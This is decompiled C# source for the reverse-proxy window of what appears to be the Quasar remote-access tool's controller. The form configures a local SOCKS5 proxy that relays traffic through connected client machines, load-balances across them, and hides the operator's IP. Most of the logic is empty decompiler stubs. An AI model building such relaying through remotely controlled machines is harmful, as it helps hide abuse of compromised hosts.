using System;
using System.ComponentModel;
using System.Drawing;
using System.Globalization;
using System.Net.Sockets;
using System.Windows.Forms;
using Server.Connection;
using Server.Helper;
using Server.Properties;

namespace Quasar.Server.Forms;

public class FrmReverseProxy : Form
{
	private readonly Clients[] _clients;

	private ReverseProxyClient[] _openConnections;

	private static readonly string[] Sizes = new string[6] { "B", "KB", "MB", "GB", "TB", "PB" };

	private IContainer components;

	private Button btnStart;

	private Label lblLocalServerPort;

	private NumericUpDown nudServerPort;

	private TabControl tabCtrl;

	private TabPage tabPage1;

	private AeroListView lstConnections;

	private ColumnHeader columnHeader1;

	private ColumnHeader columnHeader2;

	private ColumnHeader columnHeader3;

	private ColumnHeader columnHeader4;

	private ColumnHeader columnHeader5;

	private Button btnStop;

	private Label lblProxyInfo;

	private ContextMenuStrip contextMenuStrip;

	private ToolStripMenuItem killConnectionToolStripMenuItem;

	private ColumnHeader columnHeader6;

	private ColumnHeader columnHeader7;

	private Label label1;

	private Label lblLoadBalance;

	public FrmReverseProxy(Clients[] clients)
	{
		_clients = clients;
		RegisterMessageHandler();
		InitializeComponent();
	}

	private void RegisterMessageHandler()
	{
	}

	private void UnregisterMessageHandler()
	{
	}

	private void ClientDisconnected(Clients client, bool connected)
	{
		//IL_000b: Unknown result type (might be due to invalid IL or missing references)
		//IL_0015: Expected O, but got Unknown
		if (!connected)
		{
			((Control)this).Invoke((Delegate)new MethodInvoker(base.Close));
		}
	}

	private void FrmReverseProxy_Load(object sender, EventArgs e)
	{
		if (_clients.Length > 1)
		{
			((Control)this).set_Text("Reverse Proxy [Load-Balancer is active]");
			((Control)lblLoadBalance).set_Text("The Load Balancer is active, " + _clients.Length + " clients will be used as proxy\r\nKeep refreshing at www.ipchicken.com to see if your ip address will keep changing, if so, it works");
		}
		else if (_clients.Length == 1)
		{
			((Control)lblLoadBalance).set_Text("The Load Balancer is not active, only 1 client is used, select multiple clients to activate the load balancer");
		}
		nudServerPort.set_Value(Settings.Default.ReverseProxyPort);
	}

	private void FrmReverseProxy_FormClosing(object sender, FormClosingEventArgs e)
	{
		Settings.Default.ReverseProxyPort = GetPortSafe();
		UnregisterMessageHandler();
	}

	private void ConnectionChanged(object sender, ReverseProxyClient[] proxyClients)
	{
	}

	private void btnStart_Click(object sender, EventArgs e)
	{
		//IL_0015: Unknown result type (might be due to invalid IL or missing references)
		//IL_0041: Unknown result type (might be due to invalid IL or missing references)
		//IL_006c: Unknown result type (might be due to invalid IL or missing references)
		//IL_008d: Unknown result type (might be due to invalid IL or missing references)
		try
		{
			if (GetPortSafe() == 0)
			{
				MessageBox.Show("Please enter a valid port > 0.", "Please enter a valid port", (MessageBoxButtons)0, (MessageBoxIcon)48);
			}
			else
			{
				ToggleConfigurationButtons(started: true);
			}
		}
		catch (SocketException ex)
		{
			if (ex.ErrorCode == 10048)
			{
				MessageBox.Show("The port is already in use.", "Listen Error", (MessageBoxButtons)0, (MessageBoxIcon)16);
			}
			else
			{
				MessageBox.Show($"An unexpected socket error occurred: {ex.Message}\n\nError Code: {ex.ErrorCode}", "Unexpected Listen Error", (MessageBoxButtons)0, (MessageBoxIcon)16);
			}
		}
		catch (Exception ex2)
		{
			MessageBox.Show("An unexpected error occurred: " + ex2.Message, "Unexpected Listen Error", (MessageBoxButtons)0, (MessageBoxIcon)16);
		}
	}

	private ushort GetPortSafe()
	{
		if (ushort.TryParse(nudServerPort.get_Value().ToString(CultureInfo.InvariantCulture), out var result))
		{
			return result;
		}
		return 0;
	}

	private void ToggleConfigurationButtons(bool started)
	{
		((Control)btnStart).set_Enabled(!started);
		((Control)nudServerPort).set_Enabled(!started);
		((Control)btnStop).set_Enabled(started);
	}

	private void btnStop_Click(object sender, EventArgs e)
	{
		ToggleConfigurationButtons(started: false);
	}

	private void nudServerPort_ValueChanged(object sender, EventArgs e)
	{
		((Control)lblProxyInfo).set_Text($"Connect to this SOCKS5 Proxy: 127.0.0.1:{nudServerPort.get_Value()} (no user/pass)");
	}

	private void LvConnections_RetrieveVirtualItem(object sender, RetrieveVirtualItemEventArgs e)
	{
	}

	public static string GetHumanReadableFileSize(long size)
	{
		double num = size;
		int num2 = 0;
		while (!(num < 1024.0) && num2 + 1 < Sizes.Length)
		{
			num2++;
			num /= 1024.0;
		}
		return $"{num:0.##} {Sizes[num2]}";
	}

	private void killConnectionToolStripMenuItem_Click(object sender, EventArgs e)
	{
	}

	protected override void Dispose(bool disposing)
	{
		if (disposing && components != null)
		{
			components.Dispose();
		}
		((Form)this).Dispose(disposing);
	}

	private void InitializeComponent()
	{
		//IL_001c: Unknown result type (might be due to invalid IL or missing references)
		//IL_0026: Expected O, but got Unknown
		//IL_0027: Unknown result type (might be due to invalid IL or missing references)
		//IL_0031: Expected O, but got Unknown
		//IL_0032: Unknown result type (might be due to invalid IL or missing references)
		//IL_003c: Expected O, but got Unknown
		//IL_003d: Unknown result type (might be due to invalid IL or missing references)
		//IL_0047: Expected O, but got Unknown
		//IL_0048: Unknown result type (might be due to invalid IL or missing references)
		//IL_0052: Expected O, but got Unknown
		//IL_0059: Unknown result type (might be due to invalid IL or missing references)
		//IL_0063: Expected O, but got Unknown
		//IL_0064: Unknown result type (might be due to invalid IL or missing references)
		//IL_006e: Expected O, but got Unknown
		//IL_006f: Unknown result type (might be due to invalid IL or missing references)
		//IL_0079: Expected O, but got Unknown
		//IL_007a: Unknown result type (might be due to invalid IL or missing references)
		//IL_0084: Expected O, but got Unknown
		//IL_0085: Unknown result type (might be due to invalid IL or missing references)
		//IL_008f: Expected O, but got Unknown
		//IL_0090: Unknown result type (might be due to invalid IL or missing references)
		//IL_009a: Expected O, but got Unknown
		//IL_00a6: Unknown result type (might be due to invalid IL or missing references)
		//IL_00b0: Expected O, but got Unknown
		//IL_00b1: Unknown result type (might be due to invalid IL or missing references)
		//IL_00bb: Expected O, but got Unknown
		//IL_00bc: Unknown result type (might be due to invalid IL or missing references)
		//IL_00c6: Expected O, but got Unknown
		//IL_00c7: Unknown result type (might be due to invalid IL or missing references)
		//IL_00d1: Expected O, but got Unknown
		//IL_00d2: Unknown result type (might be due to invalid IL or missing references)
		//IL_00dc: Expected O, but got Unknown
		//IL_00dd: Unknown result type (might be due to invalid IL or missing references)
		//IL_00e7: Expected O, but got Unknown
		//IL_00e8: Unknown result type (might be due to invalid IL or missing references)
		//IL_00f2: Expected O, but got Unknown
		//IL_0374: Unknown result type (might be due to invalid IL or missing references)
		//IL_0703: Unknown result type (might be due to invalid IL or missing references)
		//IL_070d: Expected O, but got Unknown
		//IL_08a2: Unknown result type (might be due to invalid IL or missing references)
		//IL_08ac: Expected O, but got Unknown
		//IL_08b8: Unknown result type (might be due to invalid IL or missing references)
		//IL_08c2: Expected O, but got Unknown
		//IL_08e7: Unknown result type (might be due to invalid IL or missing references)
		//IL_08f1: Expected O, but got Unknown
		components = new Container();
		ComponentResourceManager componentResourceManager = new ComponentResourceManager(typeof(FrmReverseProxy));
		btnStart = new Button();
		lblLocalServerPort = new Label();
		nudServerPort = new NumericUpDown();
		tabCtrl = new TabControl();
		tabPage1 = new TabPage();
		contextMenuStrip = new ContextMenuStrip(components);
		killConnectionToolStripMenuItem = new ToolStripMenuItem();
		btnStop = new Button();
		lblProxyInfo = new Label();
		label1 = new Label();
		lblLoadBalance = new Label();
		lstConnections = new AeroListView();
		columnHeader6 = new ColumnHeader();
		columnHeader7 = new ColumnHeader();
		columnHeader1 = new ColumnHeader();
		columnHeader2 = new ColumnHeader();
		columnHeader3 = new ColumnHeader();
		columnHeader4 = new ColumnHeader();
		columnHeader5 = new ColumnHeader();
		((ISupportInitialize)nudServerPort).BeginInit();
		((Control)tabCtrl).SuspendLayout();
		((Control)tabPage1).SuspendLayout();
		((Control)contextMenuStrip).SuspendLayout();
		((Control)this).SuspendLayout();
		((Control)btnStart).set_Location(new Point(243, 12));
		((Control)btnStart).set_Name("btnStart");
		((Control)btnStart).set_Size(new Size(114, 23));
		((Control)btnStart).set_TabIndex(0);
		((Control)btnStart).set_Text("Start Listening");
		((ButtonBase)btnStart).set_UseVisualStyleBackColor(true);
		((Control)btnStart).add_Click((EventHandler)btnStart_Click);
		((Control)lblLocalServerPort).set_AutoSize(true);
		((Control)lblLocalServerPort).set_Location(new Point(22, 17));
		((Control)lblLocalServerPort).set_Name("lblLocalServerPort");
		((Control)lblLocalServerPort).set_Size(new Size(91, 13));
		((Control)lblLocalServerPort).set_TabIndex(1);
		((Control)lblLocalServerPort).set_Text("Local Server Port");
		((Control)nudServerPort).set_Location(new Point(117, 15));
		nudServerPort.set_Maximum(new decimal(new int[4] { 65534, 0, 0, 0 }));
		nudServerPort.set_Minimum(new decimal(new int[4] { 1, 0, 0, 0 }));
		((Control)nudServerPort).set_Name("nudServerPort");
		((Control)nudServerPort).set_Size(new Size(120, 22));
		((Control)nudServerPort).set_TabIndex(2);
		((UpDownBase)nudServerPort).set_TextAlign((HorizontalAlignment)2);
		nudServerPort.set_Value(new decimal(new int[4] { 3128, 0, 0, 0 }));
		nudServerPort.add_ValueChanged((EventHandler)nudServerPort_ValueChanged);
		((Control)tabCtrl).set_Anchor((AnchorStyles)15);
		((Control)tabCtrl).get_Controls().Add((Control)(object)tabPage1);
		((Control)tabCtrl).set_Location(new Point(26, 115));
		((Control)tabCtrl).set_Name("tabCtrl");
		tabCtrl.set_SelectedIndex(0);
		((Control)tabCtrl).set_Size(new Size(736, 274));
		((Control)tabCtrl).set_TabIndex(3);
		((Control)tabPage1).get_Controls().Add((Control)(object)lstConnections);
		tabPage1.set_Location(new Point(4, 22));
		((Control)tabPage1).set_Name("tabPage1");
		((Control)tabPage1).set_Padding(new Padding(3));
		((Control)tabPage1).set_Size(new Size(728, 248));
		tabPage1.set_TabIndex(0);
		((Control)tabPage1).set_Text("Open Connections");
		tabPage1.set_UseVisualStyleBackColor(true);
		((ToolStrip)contextMenuStrip).get_Items().AddRange((ToolStripItem[])(object)new ToolStripItem[1] { (ToolStripItem)killConnectionToolStripMenuItem });
		((Control)contextMenuStrip).set_Name("contextMenuStrip1");
		((Control)contextMenuStrip).set_Size(new Size(156, 26));
		((ToolStripItem)killConnectionToolStripMenuItem).set_Name("killConnectionToolStripMenuItem");
		((ToolStripItem)killConnectionToolStripMenuItem).set_Size(new Size(155, 22));
		((ToolStripItem)killConnectionToolStripMenuItem).set_Text("Kill Connection");
		((ToolStripItem)killConnectionToolStripMenuItem).add_Click((EventHandler)killConnectionToolStripMenuItem_Click);
		((Control)btnStop).set_Enabled(false);
		((Control)btnStop).set_Location(new Point(363, 12));
		((Control)btnStop).set_Name("btnStop");
		((Control)btnStop).set_Size(new Size(114, 23));
		((Control)btnStop).set_TabIndex(4);
		((Control)btnStop).set_Text("Stop Listening");
		((ButtonBase)btnStop).set_UseVisualStyleBackColor(true);
		((Control)btnStop).add_Click((EventHandler)btnStop_Click);
		((Control)lblProxyInfo).set_AutoSize(true);
		((Control)lblProxyInfo).set_Location(new Point(23, 51));
		((Control)lblProxyInfo).set_Name("lblProxyInfo");
		((Control)lblProxyInfo).set_Size(new Size(312, 13));
		((Control)lblProxyInfo).set_TabIndex(5);
		((Control)lblProxyInfo).set_Text("Connect to this SOCKS5 Proxy: 127.0.0.1:3128 (no user/pass)");
		((Control)label1).set_AutoSize(true);
		((Control)label1).set_Location(new Point(23, 67));
		((Control)label1).set_Name("label1");
		((Control)label1).set_Size(new Size(405, 13));
		((Control)label1).set_TabIndex(6);
		((Control)label1).set_Text("All the DNS Queries will be executed at the remote client to reduce DNS Leaks");
		((Control)lblLoadBalance).set_AutoSize(true);
		((Control)lblLoadBalance).set_Location(new Point(23, 84));
		((Control)lblLoadBalance).set_Name("lblLoadBalance");
		((Control)lblLoadBalance).set_Size(new Size(105, 13));
		((Control)lblLoadBalance).set_TabIndex(7);
		((Control)lblLoadBalance).set_Text("[Load Balance Info]");
		((ListView)lstConnections).get_Columns().AddRange((ColumnHeader[])(object)new ColumnHeader[7] { columnHeader6, columnHeader7, columnHeader1, columnHeader2, columnHeader3, columnHeader4, columnHeader5 });
		((Control)lstConnections).set_ContextMenuStrip(contextMenuStrip);
		((Control)lstConnections).set_Dock((DockStyle)5);
		((ListView)lstConnections).set_FullRowSelect(true);
		((ListView)lstConnections).set_GridLines(true);
		((Control)lstConnections).set_Location(new Point(3, 3));
		((Control)lstConnections).set_Name("lstConnections");
		((Control)lstConnections).set_Size(new Size(722, 242));
		((Control)lstConnections).set_TabIndex(0);
		((ListView)lstConnections).set_UseCompatibleStateImageBehavior(false);
		((ListView)lstConnections).set_View((View)1);
		((ListView)lstConnections).set_VirtualMode(true);
		((ListView)lstConnections).add_RetrieveVirtualItem(new RetrieveVirtualItemEventHandler(LvConnections_RetrieveVirtualItem));
		columnHeader6.set_Text("Client IP");
		columnHeader6.set_Width(106);
		columnHeader7.set_Text("Client Country");
		columnHeader7.set_Width(106);
		columnHeader1.set_Text("Target Server");
		columnHeader1.set_Width(135);
		columnHeader2.set_Text("Target Port");
		columnHeader2.set_Width(68);
		columnHeader3.set_Text("Total Received");
		columnHeader3.set_Width(105);
		columnHeader4.set_Text("Total Sent");
		columnHeader4.set_Width(95);
		columnHeader5.set_Text("Proxy Type");
		columnHeader5.set_Width(90);
		((ContainerControl)this).set_AutoScaleDimensions(new SizeF(96f, 96f));
		((ContainerControl)this).set_AutoScaleMode((AutoScaleMode)2);
		((Form)this).set_ClientSize(new Size(777, 402));
		((Control)this).get_Controls().Add((Control)(object)lblLoadBalance);
		((Control)this).get_Controls().Add((Control)(object)label1);
		((Control)this).get_Controls().Add((Control)(object)lblProxyInfo);
		((Control)this).get_Controls().Add((Control)(object)btnStop);
		((Control)this).get_Controls().Add((Control)(object)tabCtrl);
		((Control)this).get_Controls().Add((Control)(object)nudServerPort);
		((Control)this).get_Controls().Add((Control)(object)lblLocalServerPort);
		((Control)this).get_Controls().Add((Control)(object)btnStart);
		((Control)this).set_Font(new Font("Segoe UI", 8.25f, (FontStyle)0, (GraphicsUnit)3, (byte)0));
		((Form)this).set_Icon((Icon)componentResourceManager.GetObject("$this.Icon"));
		((Control)this).set_Name("FrmReverseProxy");
		((Form)this).set_StartPosition((FormStartPosition)1);
		((Control)this).set_Text("Reverse Proxy []");
		((Form)this).add_FormClosing(new FormClosingEventHandler(FrmReverseProxy_FormClosing));
		((Form)this).add_Load((EventHandler)FrmReverseProxy_Load);
		((ISupportInitialize)nudServerPort).EndInit();
		((Control)tabCtrl).ResumeLayout(false);
		((Control)tabPage1).ResumeLayout(false);
		((Control)contextMenuStrip).ResumeLayout(false);
		((Control)this).ResumeLayout(false);
		((Control)this).PerformLayout();
	}
}
